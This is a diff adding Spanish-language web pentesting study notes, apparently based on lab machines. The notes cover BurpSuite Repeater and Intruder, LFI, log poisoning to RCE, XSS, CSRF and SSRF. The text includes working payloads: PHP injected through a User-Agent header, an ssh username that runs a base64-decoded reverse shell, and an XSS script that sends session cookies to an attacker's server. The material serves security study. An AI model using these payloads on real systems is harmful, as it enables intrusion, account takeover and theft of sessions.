@@ -821,6 +821,7 @@ Este proceso detalla cómo explotar manualmente una vulnerabilidad sin utilizar 
     Si el exploit es exitoso, se ganará acceso a la máquina víctima a través de una reverse shell.
 
 
+
 Estos pasos proporcionan una guía completa para utilizar Searchsploit, Exploit-DB y Metasploit para la búsqueda y explotación de vulnerabilidades, así como para entender la diferencia entre vulnerabilidades locales y remotas y cómo explotarlas manualmente.
 
 ---
@@ -909,6 +910,205 @@ BurpSuite es una herramienta poderosa para pentesting web, actuando como un inte
         shred -zun 10 -v <nombre archivo>
         ```
 
+
 Estos pasos proporcionan una guía completa para utilizar BurpSuite en el pentesting de aplicaciones web, incluyendo la configuración inicial, la definición de un scope, y la explotación de vulnerabilidades mediante la subida de archivos maliciosos y la ejecución de comandos remotos.
 
 ---
+
+# BurpSuite: Uso del Repeater y Explotando un Caso Práctico
+
+## Uso del Repeater
+
+El Repeater de BurpSuite permite reejecutar comandos sin repetir todo el proceso de explotación.
+
+1. **Seleccionar Petición en HTTP History**:
+    - Ir a `HTTP history`.
+    - Seleccionar la petición de subida del archivo malicioso (POST).
+    - Enviar al Repeater con `Ctrl + R` o click derecho y `Send to Repeater`.
+
+2. **Ejecutar Petición en el Repeater**:
+    - En el Repeater, hacer click en `Go` para ver la respuesta del servidor.
+    - Capturar la petición de un comando con `Intercept on` y enviar al Repeater para ejecutarlo directamente desde BurpSuite.
+
+3. **Formato URL-encoded**:
+    - Asegurarse de que los comandos están en formato `URL-encoded` (ejemplo: `ls -l` se convierte en `ls+-l`).
+    - Seleccionar el comando y usar `Ctrl + u` para hacer el cambio automáticamente.
+
+---
+
+# Uso del Intruder y Explotando un Caso Práctico
+
+## Configuración del Intruder
+
+1. **Enviar Petición al Intruder**:
+    - Desde el Repeater, enviar la petición de RCE al Intruder con `Ctrl + i` o click derecho y `Send to Intruder`.
+
+2. **Configurar Posiciones y Payloads**:
+    - En la pestaña de `Positions`, clickar `Clear` y definir los payloads manualmente.
+    - Asegurarse que el `Attack type` es `Sniper`.
+    - Seleccionar el comando a ejecutar y clickar `Add`.
+
+3. **Cargar Diccionario de Comandos**:
+    - Ir a la pestaña de `Payloads` y cargar un diccionario de comandos.
+
+4. **Configurar Grep-Extract**:
+    - En la pestaña de `Options`, configurar `Grep-Extract` con una expresión regular para mostrar solo la salida del comando.
+
+5. **Ejecutar el Ataque**:
+    - Click en `Start Attack`. BurpSuite ejecutará todos los comandos del diccionario y aplicará el filtro para mostrar los resultados en una pestaña.
+
+---
+
+# Explotando Vulnerabilidad Local File Inclusion (LFI)
+
+## Procedimiento Básico
+
+1. **Escaneo Inicial**:
+    - Realizar un escaneo para identificar el SO, puertos abiertos, y servicios.
+    - Buscar exploits relevantes con `searchsploit`.
+
+2. **Identificación de LFI**:
+    - Buscar vulnerabilidades específicas como LFI (ejemplo: `searchsploit Elastix`).
+    - Inspeccionar el código del exploit (`searchsploit -x <path>`).
+
+3. **Explotación de LFI**:
+    - Utilizar path traversal (`../../../../etc/file.conf`) y `%00` para leer archivos.
+    - Copiar el exploit en la URL para mostrar el fichero de configuración.
+
+4. **Lectura de Ficheros**:
+    - Leer cualquier fichero accesible por el usuario detrás del gestor de contenidos.
+
+5. **Utilización de BurpSuite**:
+    - Interceptar peticiones con BurpSuite para trabajar de manera más eficiente.
+    - Definir el scope para interceptar solo las peticiones relevantes.
+
+6. **Exploración de Puertos Internos**:
+    - Leer `/proc/net/tcp` para ver puertos abiertos internamente.
+    - Aplicar filtro para visualizar puertos en hexadecimal:
+        ```bash
+        cat file.txt | awk '{print $2}' | awk '{print $2}' FS=":"| sort -u
+        ```
+
+---
+
+# Explotando Vulnerabilidad Log Poisoning - LFI to RCE
+
+## Convertir LFI a RCE
+
+1. **Log Poisoning**:
+    - Identificar un archivo `.log` accesible y mal configurado.
+    - Leer el archivo `access.log` de Apache.
+
+2. **Inserción de Código PHP**:
+    - Usar `curl` para insertar código PHP en el `User-Agent`:
+        ```bash
+        curl "http://LFI=/var/log/apache2/access.log" -H "User-Agent: <?php system('whoami')?>"
+        ```
+
+3. **Ejecutar Código PHP**:
+    - Leer el `access.log` para ejecutar el comando `whoami`.
+
+4. **Obtener RCE con `auth.log`**:
+    - Usar `ssh` para insertar un código en `auth.log`:
+        ```bash
+        ssh '<?php system("echo <codigo en base64 para obtener una reverse shell> | base64 -d | bash");?>'@localhost
+        ```
+    - Escuchar con Netcat en la máquina atacante.
+    - Lanzar la petición de lectura de `auth.log` para obtener una shell.
+
+
+
+Estos pasos detallan cómo usar BurpSuite para reejecutar comandos con el Repeater, automatizar ataques con el Intruder, y explotar vulnerabilidades como LFI y Log Poisoning para obtener RCE, proporcionando un enfoque sistemático y eficiente en el pentesting de aplicaciones web.
+
+---
+
+# Explotando la Vulnerabilidad HTML Injection y XSS (Cross-Site Scripting)
+
+## Procedimiento Básico
+
+1. **Escaneo Inicial**:
+   - Realizar un escaneo de la máquina víctima (ejemplo: `Secnotes`) utilizando herramientas como `whichSystem`, `whatweb`, `nmap`.
+   - Lanzar scripts básicos de enumeración.
+
+2. **Investigación del Servicio Web**:
+   - Registrar una cuenta en el servicio web.
+   - Verificar la vulnerabilidad de inyección HTML creando una nota con:
+     ```html
+     <h1>Texto</h1>
+     ```
+     Si el texto se muestra en grande, es vulnerable.
+
+3. **Comprobación de XSS**:
+   - Crear una nota con:
+     ```html
+     <script>alert("Texto")</script>
+     ```
+     Si aparece una ventana emergente, es vulnerable a XSS.
+
+4. **Explotación de XSS para Robar Cookies**:
+   - Iniciar un servidor HTTP con Python:
+     ```bash
+     python -m SimpleHTTPServer 80
+     ```
+   - Crear una nota con:
+     ```html
+     <script>document.write('<img src="http://<ip local>/image.jpg?cookie=' + document.cookie + '">')</script>
+     ```
+     Al recargar, se captura la cookie de sesión del usuario.
+
+5. **Uso de BurpSuite**:
+   - Modificar el campo de cookie en la petición a la página ya logueada (`ip/home.php`) para iniciar sesión sin necesidad de contraseña.
+
+---
+
+# Explotando Vulnerabilidad Cross-Site Request Forgery (CSRF)
+
+## Procedimiento Básico
+
+1. **Intercepción de Cambio de Contraseña**:
+   - Interceptar una petición de cambio de contraseña de una cuenta de usuario con BurpSuite.
+   - Cambiar la petición a GET en BurpSuite (`Change request method`).
+
+2. **Modificación y Transmisión de la Petición**:
+   - Transmitir la petición modificada y verificar si el cambio de contraseña se efectúa (`password updated`).
+
+3. **Explotación de CSRF**:
+   - Crear una URL que aplique cambios (por ejemplo, cambio de contraseña) y utilizar ingeniería social para que un administrador acceda a la URL construida.
+   - Ganar acceso a la cuenta del administrador.
+
+---
+
+# Explotando Vulnerabilidad Server-Side Request Forgery (SSRF)
+
+## Procedimiento Básico
+
+1. **Escaneo Inicial**:
+   - Realizar un escaneo de la máquina víctima (ejemplo: `Haircut`) utilizando herramientas como `whichSystem`, `whatweb`, `nmap`.
+   - Lanzar scripts básicos de enumeración.
+
+2. **Búsqueda de Rutas Potenciales con wfuzz**:
+   - Utilizar `wfuzz` para buscar recursos PHP visibles:
+     ```bash
+     wfuzz -c -t 500 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.24/FUZZ.php
+     ```
+
+3. **Identificación de Recursos Internos**:
+   - Encontrar el recurso `exposed.php` que permite hacer peticiones al servidor de recursos internos.
+   - Verificar si hay más puertos abiertos internamente.
+
+4. **Uso de BurpSuite**:
+   - Interceptar la petición a `http://localhost:1` en `exposed.php`.
+   - Enviar la petición al Intruder de BurpSuite.
+
+5. **Configuración del Intruder**:
+   - Configurar `Positions` para un ataque tipo `Sniper`.
+   - Seleccionar el número de puerto y añadir `$` para inyectar payloads.
+   - Configurar `Payloads` como `Numbers`, secuencia de 1 a 65535 con un paso de 1.
+
+6. **Ejecutar el Ataque y Análisis**:
+   - Efectuar el ataque y analizar el tamaño de las respuestas para identificar puertos abiertos.
+   - Listar información privilegiada interna que no debería ser visible.
+
+
+
+Estos procedimientos detallan cómo explotar las vulnerabilidades HTML Injection, XSS, CSRF y SSRF utilizando diversas herramientas y técnicas para comprometer la seguridad de aplicaciones web y obtener acceso no autorizado a información sensible.
